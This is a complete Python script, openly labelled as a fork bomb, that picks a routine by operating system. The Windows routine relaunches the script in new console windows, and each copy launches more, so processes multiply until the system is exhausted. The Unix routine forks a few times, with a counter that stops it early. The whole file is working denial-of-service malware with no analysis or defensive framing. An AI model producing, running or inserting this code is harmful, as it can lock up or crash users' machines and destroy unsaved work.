## -*- coding: utf-8 -*-
#!/usr/bin/env python3

## >>
## Imports some Modules.
## >>

import subprocess
import sys
import time
import random
import os
import platform

## >>
## Sets the Variables for Operating System name and the number for the while loop.
## >>

opsys = platform.system()
i = 0

## >>
## Defines the fork bomb functions for the various Operating Systems.
## >>

def forkbombwin(i):
    subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
    while i != 6:
        i += 1
        subprocess.Popen([sys.executable, sys.argv[0]], creationflags=subprocess.CREATE_NEW_CONSOLE)
        if i == 6:
            break
def forkbombunix(i):
    os.fork()
    while i != 6:
        i += 6
        os.fork()
        if i == 6:
            break
## >>
## Checks for the Operating System name and executes the right function.
## >>

if opsys == "Windows":
    forkbombwin(i)
if opsys == "Linux" or opsys == "Darwin":
    forkbombunix(i)
